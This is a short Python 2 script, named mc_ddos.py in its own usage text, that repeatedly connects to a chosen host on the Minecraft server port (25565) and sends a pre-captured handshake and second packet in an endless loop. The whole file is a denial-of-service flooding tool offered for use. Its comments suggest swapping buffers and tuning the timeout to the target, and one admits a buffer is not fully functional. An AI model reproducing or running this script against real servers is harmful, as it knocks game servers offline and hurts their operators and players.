import socket
import sys

try:
    host = sys.argv[1]
    port = 25565
except IndexError:
    print "[+] Usage %s <host> " % sys.argv[0]
    print "[i] Example: mc_ddos.py localhost"
    sys.exit()


#rootbuffer = "1000bc02093132372e302e302e3163dd020900076d65726b333630" #other buffer switch if you want to 
#rootbuffer = "1000bc020931302e302e312e313263dd020900076d65726b333630" #other buffer switch if you want to 
rootbuffer = "1500bc020e3135382e36392e3132322e31333463dd020900076d65726b333630" # test buffer not fully functional
buffer = rootbuffer.decode("hex")

#Second packet information for mc server ddos
secondbufferhex = "85020180017b757f9c415785c2515086c02fbb353ec7e8fa1dbd52d722145e7a47623e1b88b5e427d5737989e202000cca4acad2ad8566a1da11e015c12e060c0bb6e62deace9ccb8658e1d2190bc2b0c33fd01d6b58b5c9406638f2b221fa82b46e9b399dea8b6dfe21ff49f85bf6ef05eff5c82d909e0a4c74e3c528f45b7bee216d24fa800174a01e725d9a5308ede10f09e12e18f15ce25241fb7dbc2f927a9558d29f879f4512b3a1eb26fc1bb6eaab7ec300a7e5607a06d655334624a55eebd6856cd790a4ac78728b4ec6b96eca403ec9d103cdf178b6127e3a592050546318cd09806737b1bd8aa5374b67228d192269424d6c5f27c1c183c86798708b6bb259c9f71c"

secondbuffer = secondbufferhex.decode("hex")

while 1:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((host,port))
    s.settimeout(4500) # change for different effect based on target max timeout
    sendbuffer = buffer
    s.send(sendbuffer)
    s.recv(4906)
    s.send(secondbuffer)
    s.close()
